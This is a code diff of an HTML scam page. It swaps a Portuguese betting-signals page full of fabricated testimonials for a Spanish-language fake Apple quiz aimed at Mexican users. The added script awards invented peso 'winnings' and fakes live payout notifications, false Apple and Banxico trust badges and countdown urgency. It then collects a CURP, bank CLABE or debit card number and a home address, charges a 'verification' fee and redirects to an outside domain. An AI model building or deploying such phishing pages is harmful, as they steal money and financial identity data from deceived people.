-                    <p class="text-xs" style="color:hsla(0,0%,100%,0.7);line-height:1.6;">"As lives são o diferencial! Ver o analista operando ao vivo me deu muita confiança. Lucro todo dia!"</p>
-                </div>
-
-                <!-- Duplicados para loop -->
-                <div class="testimonial-card">
-                    <div class="flex items-center gap-3 mb-3">
-                        <img src="https://i.pravatar.cc/40?img=1" alt="" class="w-10 h-10 rounded-full">
-                        <div>
-                            <div class="font-semibold text-sm">Lucas M.</div>
-                            <div class="text-xs" style="color:hsl(142,71%,45%);">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
-                    <p class="text-xs" style="color:hsla(0,0%,100%,0.7);line-height:1.6;">"Entrei sem acreditar muito, mas já no primeiro dia recebi sinais que me fizeram lucrar. Grupo sensacional!"</p>
-                </div>
-
-                <div class="testimonial-card">
-                    <div class="flex items-center gap-3 mb-3">
-                        <img src="https://i.pravatar.cc/40?img=5" alt="" class="w-10 h-10 rounded-full">
-                        <div>
-                            <div class="font-semibold text-sm">Amanda S.</div>
-                            <div class="text-xs" style="color:hsl(142,71%,45%);">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
-                    <p class="text-xs" style="color:hsla(0,0%,100%,0.7);line-height:1.6;">"Melhor comunidade que já participei! Os analistas são muito competentes e as lives são incríveis."</p>
-                </div>
-
-                <div class="testimonial-card">
-                    <div class="flex items-center gap-3 mb-3">
-                        <img src="https://i.pravatar.cc/40?img=8" alt="" class="w-10 h-10 rounded-full">
-                        <div>
-                            <div class="font-semibold text-sm">Rafael C.</div>
-                            <div class="text-xs" style="color:hsl(142,71%,45%);">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
-                    <p class="text-xs" style="color:hsla(0,0%,100%,0.7);line-height:1.6;">"Taxa de acerto absurda! Fiz minha banca crescer 300% em duas semanas seguindo os sinais."</p>
-                </div>
-
-                <div class="testimonial-card">
-                    <div class="flex items-center gap-3 mb-3">
-                        <img src="https://i.pravatar.cc/40?img=12" alt="" class="w-10 h-10 rounded-full">
-                        <div>
-                            <div class="font-semibold text-sm">Juliana P.</div>
-                            <div class="text-xs" style="color:hsl(142,71%,45%);">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
-                    <p class="text-xs" style="color:hsla(0,0%,100%,0.7);line-height:1.6;">"Grupo top demais! Suporte incrível e os resultados falam por si. Recomendo de olhos fechados."</p>
-                </div>
-
-                <div class="testimonial-card">
-                    <div class="flex items-center gap-3 mb-3">
-                        <img src="https://i.pravatar.cc/40?img=15" alt="" class="w-10 h-10 rounded-full">
-                        <div>
-                            <div class="font-semibold text-sm">Pedro H.</div>
-                            <div class="text-xs" style="color:hsl(142,71%,45%);">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
-                    <p class="text-xs" style="color:hsla(0,0%,100%,0.7);line-height:1.6;">"Estava cético no início mas os resultados são reais. Melhor investimento que já fiz!"</p>
-                </div>
-
-                <div class="testimonial-card">
-                    <div class="flex items-center gap-3 mb-3">
-                        <img src="https://i.pravatar.cc/40?img=20" alt="" class="w-10 h-10 rounded-full">
-                        <div>
-                            <div class="font-semibold text-sm">Carla F.</div>
-                            <div class="text-xs" style="color:hsl(142,71%,45%);">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
-                    <p class="text-xs" style="color:hsla(0,0%,100%,0.7);line-height:1.6;">"As lives são o diferencial! Ver o analista operando ao vivo me deu muita confiança. Lucro todo dia!"</p>
-                </div>
-            </div>
+    <div class="taxa-item">
+        <div class="icon">⚡</div>
+        <div>
+            <b>SPEI Instantáneo</b>
+            <p>Liberación inmediata tras la validación de seguridad.</p>
         </div>
     </div>
 
-    <!-- Footer -->
-    <div class="text-center py-6 text-xs" style="color:hsla(0,0%,100%,0.3);border-top:1px solid hsla(142,40%,20%,0.2);">
-        ©️ 2026 Comunidade GoldBet - Todos os direitos reservados.
+    <div class="taxa-item">
+        <div class="icon">🛡️</div>
+        <div>
+            <b>Protegido por Apple México</b>
+            <p>Tu información está protegida con cifrado de extremo a extremo.</p>
+        </div>
     </div>
 
-    <script>
-        // Progress bar animation
+    <button class="btn-primary btn-blue" id="btnPagarTaxa">PAGAR VERIFICACIÓN Y RECIBIR</button>
+
+    <div class="trust-bar">
+        <div class="trust-item">🔒 256-bit SSL</div>
+        <div class="trust-item">🇲🇽 Banxico</div>
+        <div class="trust-item">✅ Verificado</div>
+    </div>
+</div>
+
+<!-- ENVÍO -->
+<div class="envio-container" id="envioContainer">
+    <div class="envio-header">
+        <span style="font-size: 48px;">📦</span>
+        <h2>Datos de Envío</h2>
+        <p>Has ganado un iPhone 15 Pro Max. Confirma tu dirección en México:</p>
+    </div>
+
+    <div class="input-group">
+        <label>Nombre completo</label>
+        <input type="text" placeholder="Ej: Juan Pérez García">
+    </div>
+    <div class="input-group">
+        <label>Calle y número</label>
+        <input type="text" placeholder="Ej: Av. Reforma 500, Int. 3">
+    </div>
+    <div class="input-group">
+        <label>Colonia</label>
+        <input type="text" placeholder="Ej: Juárez">
+    </div>
+    <div class="input-group">
+        <label>Ciudad y Estado</label>
+        <input type="text" placeholder="Ej: Ciudad de México, CDMX">
+    </div>
+    <div class="input-group">
+        <label>Código Postal</label>
+        <input type="text" placeholder="Ej: 06600" maxlength="5">
+    </div>
+
+    <button class="btn-primary btn-success" id="btnFinalizar">CONFIRMAR ENVÍO Y RECIBIR SPEI</button>
+</div>
+
+<!-- POPUP GANASTE -->
+<div class="popup" id="popupGanhou">
+    <div class="popup-box">
+        <div class="popup-icon">🪙</div>
+        <div class="popup-label">¡Acabas de ganar!</div>
+        <div class="popup-valor" id="popupValor">$0.00 MXN</div>
+        <p class="popup-subtitle">Este monto se ha sumado a tu saldo</p>
+        <button class="btn-primary btn-blue" onclick="proxima()">Continuar Quiz ➜</button>
+    </div>
+</div>
+
+<!-- POPUP CONQUISTA -->
+<div class="popup" id="popupConquista">
+    <div class="popup-box conquista-box">
+        <div class="popup-icon">🎉</div>
+        <h2 style="font-size: 22px;">¡Logro Completo!</h2>
+        <div class="conquista-valor" id="valorFinalTotal">$0.00 MXN</div>
+        <p style="font-size: 14px; margin-bottom: 20px;">Tu iPhone 15 Pro y el depósito están listos.</p>
+        <p style="font-size: 13px; margin-bottom: 20px; opacity: 0.6;">Haz clic abajo para finalizar tu registro en la pasarela segura.</p>
+        <button class="btn-primary btn-success" id="btnFinalReal">FINALIZAR AHORA ➜</button>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+<script>
+    // ===== COIN SOUND via Web Audio API =====
+    const AudioCtx = window.AudioContext || window.webkitAudioContext;
+    let audioCtx;
+    function playCoinSound() {
+        if (!audioCtx) audioCtx = new AudioCtx();
+        // Create a coin-like sound with oscillators
+        const now = audioCtx.currentTime;
+
+        // High ping
+        const osc1 = audioCtx.createOscillator();
+        const gain1 = audioCtx.createGain();
+        osc1.type = 'sine';
+        osc1.frequency.setValueAtTime(1200, now);
+        osc1.frequency.exponentialRampToValueAtTime(1800, now + 0.08);
+        gain1.gain.setValueAtTime(0.3, now);
+        gain1.gain.exponentialRampToValueAtTime(0.01, now + 0.3);
+        osc1.connect(gain1).connect(audioCtx.destination);
+        osc1.start(now);
+        osc1.stop(now + 0.3);
+
+        // Second ping (delayed)
+        const osc2 = audioCtx.createOscillator();
+        const gain2 = audioCtx.createGain();
+        osc2.type = 'sine';
+        osc2.frequency.setValueAtTime(1600, now + 0.08);
+        osc2.frequency.exponentialRampToValueAtTime(2200, now + 0.15);
+        gain2.gain.setValueAtTime(0.2, now + 0.08);
+        gain2.gain.exponentialRampToValueAtTime(0.01, now + 0.35);
+        osc2.connect(gain2).connect(audioCtx.destination);
+        osc2.start(now + 0.08);
+        osc2.stop(now + 0.35);
+    }
+
+    // ===== FLOATING COIN ANIMATION =====
+    function spawnCoinAnimation() {
+        const moneyBox = document.getElementById('saldoTopo');
+        const rect = moneyBox.getBoundingClientRect();
+        const coin = document.createElement('span');
+        coin.className = 'coin-float';
+        coin.textContent = '🪙';
+        coin.style.left = (rect.left + rect.width/2 - 10) + 'px';
+        coin.style.top = (rect.top) + 'px';
+        coin.style.position = 'fixed';
+        coin.style.zIndex = '9999';
+        document.body.appendChild(coin);
+        setTimeout(() => coin.remove(), 1000);
+    }
+
+    // ===== NOTIFICACIONES =====
+    const mexicanNames = ["Ximena G.", "Alejandro M.", "Sofía R.", "Miguel Ángel L.", "Valentina H.", "Mateo S.", "Camila D.", "Diego F.", "Isabella P.", "Javier T.", "Lucía V.", "Carlos N.", "Renata O.", "Fernando C.", "Mariana B.", "Ana Karen Z.", "Roberto J.", "Guadalupe A.", "José Luis Q.", "Paola E."];
+    const mexicanCities = ["CDMX", "Guadalajara", "Monterrey", "Puebla", "Cancún", "Mérida", "Querétaro", "León", "Tijuana", "Oaxaca"];
+
+    function showNotification() {
+        const notif = document.getElementById('notification');
+        const name = mexicanNames[Math.floor(Math.random() * mexicanNames.length)];
+        const city = mexicanCities[Math.floor(Math.random() * mexicanCities.length)];
+        const amount = (Math.random() * (3500 - 1500) + 1500).toFixed(2);
+        const imgId = Math.floor(Math.random() * 70);
+
+        document.getElementById('notifImg').src = `https://i.pravatar.cc/100?u=${imgId}`;
+        document.getElementById('notifTitle').innerText = `${name} de ${city}`;
+        document.getElementById('notifText').innerText = `Recibió $${amount} MXN vía SPEI`;
+
+        notif.classList.add('show');
+        setTimeout(() => notif.classList.remove('show'), 4500);
+    }
+
+    setInterval(showNotification, 9000);
+    setTimeout(showNotification, 3000);
+
+    // ===== QUIZ =====
+    const perguntas = [
+        { t: "¿Qué producto Apple usas más?", o: ["📱 iPhone", "💻 MacBook", "⌚ Apple Watch", "🎧 AirPods"] },
+        { t: "¿Cómo calificas el rendimiento de iOS?", o: ["🚀 Excelente", "👍 Bueno", "🙂 Regular", "😕 Podría mejorar"] },
+        { t: "¿Te gustaría probar el Apple Vision Pro?", o: ["🤩 ¡Claro!", "🤔 Quizás", "😎 Ya lo quiero", "🙅‍♂️ No sé"] },
+        { t: "¿Qué color de iPhone prefieres?", o: ["⚪ Blanco", "⚫ Negro", "🩶 Titanio", "🔵 Azul"] },
+        { t: "¿Usas iCloud para tus fotos?", o: ["☁️ Sí, siempre", "📱 No, solo local", "🔄 Prefiero otra nube", "💎 Tengo el plan Pro"] },
+        { t: "¿Cuál es tu prioridad al comprar?", o: ["📸 Cámara", "🔋 Batería", "⚡ Velocidad", "🎨 Diseño"] },
+        { t: "¿Qué opinas de los nuevos AirPods?", o: ["🎧 Increíbles", "👌 Buenos", "🙂 Están bien", "💸 Muy caros"] },
+        { t: "¿Usas Apple Pay en México?", o: ["💳 Sí, todo el tiempo", "📱 A veces", "🏦 No sé usarlo", "❌ No"] },
+        { t: "¿Steve Jobs es tu inspiración?", o: ["🍎 Sí, totalmente", "👔 Prefiero a Wozniak", "📈 Un gran líder", "🤷‍♂️ Solo uso el cel"] },
+        { t: "¿Cuál será tu próximo Apple?", o: ["📱 iPhone 15", "⌚ Watch Ultra", "💻 Mac M3", "🕶️ Vision Pro"] },
+        { t: "¿Recomendarías Apple a un amigo?", o: ["✅ Al 100%", "🤔 Tal vez", "🙌 Definitivamente", "🌟 Sí"] },
+        { t: "¿Estás listo para tu recompensa?", o: ["🔥 ¡SÍ!", "🚀 ¡VAMOS!", "💰 ¡LISTO!", "🎁 ¡DÁMELA!"] }
+    ];
+
+    const valores = [142.20, 110.50, 195.30, 125.80, 150.40, 130.20, 165.90, 140.10, 180.50, 210.30, 155.70, 324.41];
+    let etapa = 0;
+    let saldoAcumulado = 0;
+
+    function formatMXN(v) { return "$" + v.toLocaleString('en-US', { minimumFractionDigits: 2 }) + " MXN"; }
+
+    function carregarPergunta() {
+        const q = perguntas[etapa];
+        document.getElementById('qTitle').innerText = q.t;
+        document.getElementById('progressText').innerText = `Pregunta ${etapa + 1} de ${perguntas.length}`;
+        const box = document.getElementById('options');
+        box.innerHTML = '';
+        document.getElementById('btnNext').disabled = true;
+        document.getElementById('progressBar').style.width = ((etapa) / perguntas.length * 100) + "%";
+
+        q.o.forEach((opt, i) => {
+            const d = document.createElement('div');
+            d.className = 'option fade-in';
+            d.style.animationDelay = (i * 0.08) + 's';
+            d.innerText = opt;
+            d.onclick = () => {
+                document.querySelectorAll('.option').forEach(el => el.classList.remove('selected'));
+                d.classList.add('selected');
+                document.getElementById('btnNext').disabled = false;
+            };
+            box.appendChild(d);
+        });
+    }
+
+    document.getElementById('btnNext').onclick = () => {
+        const v = valores[etapa];
+        document.getElementById('popupGanhou').style.display = 'flex';
+
+        // Coin sound + animation
+        playCoinSound();
+        spawnCoinAnimation();
+
+        let atual = 0;
+        const anim = setInterval(() => {
+            atual += v / 20;
+            if (atual >= v) { atual = v; clearInterval(anim); }
+            document.getElementById('popupValor').innerText = formatMXN(atual);
+        }, 35);
+
+        saldoAcumulado += v;
         setTimeout(() => {
-            const bar = document.getElementById('progressBar');
-            const text = document.getElementById('progressText');
-            if (bar && text) {
-                bar.style.width = '87%';
-                text.textContent = '87% PREENCHIDAS';
-            }
-        }, 800);
+            document.getElementById('saldoTopo').innerText = formatMXN(saldoAcumulado);
+            document.getElementById('saldoTopo').classList.add('shine');
+            setTimeout(() => document.getElementById('saldoTopo').classList.remove('shine'), 800);
+        }, 500);
+    };
 
-        // Notification rotation
-        const nomes = ['Lucas M.','Amanda S.','Rafael C.','Juliana P.','Pedro H.','Carla F.','Bruno T.','Marina L.','Diego R.','Fernanda A.'];
-        const notif = document.getElementById('notif');
-        let ni = 0;
-        function showNotif() {
-            if (!notif) return;
-            const nome = nomes[ni % nomes.length];
-            const imgId = (ni % 30) + 1;
-            notif.querySelector('img').src = 'https://i.pravatar.cc/100?img=' + imgId;
-            notif.querySelector('div > div:first-child').textContent = nome;
-            notif.classList.add('show');
-            setTimeout(() => notif.classList.remove('show'), 3500);
-            ni++;
+    function proxima() {
+        document.getElementById('popupGanhou').style.display = 'none';
+        etapa++;
+        if (etapa < perguntas.length) {
+            carregarPergunta();
+        } else {
+            document.getElementById('progressBar').style.width = "100%";
+            confetti({ particleCount: 200, spread: 80, origin: { y: 0.6 } });
+            setTimeout(() => confetti({ particleCount: 100, spread: 60, origin: { y: 0.5 } }), 300);
+            document.getElementById('quizContainer').style.display = 'none';
+            document.getElementById('resgateContainer').style.display = 'block';
+            document.getElementById('saldoFinal').innerText = formatMXN(saldoAcumulado);
         }
-        setTimeout(showNotif, 3000);
-        setInterval(showNotif, 8000);
-    </script>
+    }
+
+    // ===== MÉTODO SELECT LABELS =====
+    const metodoSelect = document.getElementById('metodoSelect');
+    const inputLabel = document.getElementById('inputLabel');
+    const chaveInput = document.getElementById('chaveInput');
+
+    metodoSelect.addEventListener('change', () => {
+        const val = metodoSelect.value;
+        if (val === 'curp') {
+            inputLabel.innerText = 'Ingresa tu CURP:';
+            chaveInput.placeholder = 'Ej: GARC850101HDFRRL09';
+        } else if (val === 'clabe') {
+            inputLabel.innerText = 'Ingresa tu CLABE Interbancaria:';
+            chaveInput.placeholder = 'Ej: 012345678901234567';
+        } else if (val === 'tarjeta') {
+            inputLabel.innerText = 'Ingresa tu número de tarjeta de débito:';
+            chaveInput.placeholder = 'Ej: 4152 3131 0000 0000';
+        }
+    });
+
+    // ===== SOLICITAR RETIRO =====
+    document.getElementById('btnSolicitar').onclick = () => {
+        if (document.getElementById('chaveInput').value.length < 5) return alert("Ingresa un dato válido para continuar.");
+        document.getElementById('btnSolicitar').style.display = 'none';
+        document.getElementById('validando').style.display = 'flex';
+        setTimeout(() => {
+            document.getElementById('resgateContainer').style.display = 'none';
+            document.getElementById('taxaContainer').style.display = 'block';
+            document.getElementById('valorComTaxa').innerText = formatMXN(saldoAcumulado + 69);
+        }, 3000);
+    };
+
+    document.getElementById('btnPagarTaxa').onclick = () => {
+        document.getElementById('taxaContainer').style.display = 'none';
+        document.getElementById('envioContainer').style.display = 'block';
+    };
+
+    document.getElementById('btnFinalizar').onclick = () => {
+        document.getElementById('envioContainer').style.display = 'none';
+        document.getElementById('popupConquista').style.display = 'flex';
+        document.getElementById('valorFinalTotal').innerText = formatMXN(saldoAcumulado + 69);
+        confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
+    };
+
+    document.getElementById('btnFinalReal').onclick = () => {
+        window.location.href = "https://compraseguraonline.org.ua/c/d4df49a4ff";
+    };
+
+    // ===== URGENCIA =====
+    let v_vagas = 12;
+    setInterval(() => {
+        if (v_vagas > 3) {
+            v_vagas--;
+            document.getElementById('vagas').innerText = v_vagas;
+        }
+    }, 15000);
+
+    carregarPergunta();
+</script>
+
 </body>
 </html>
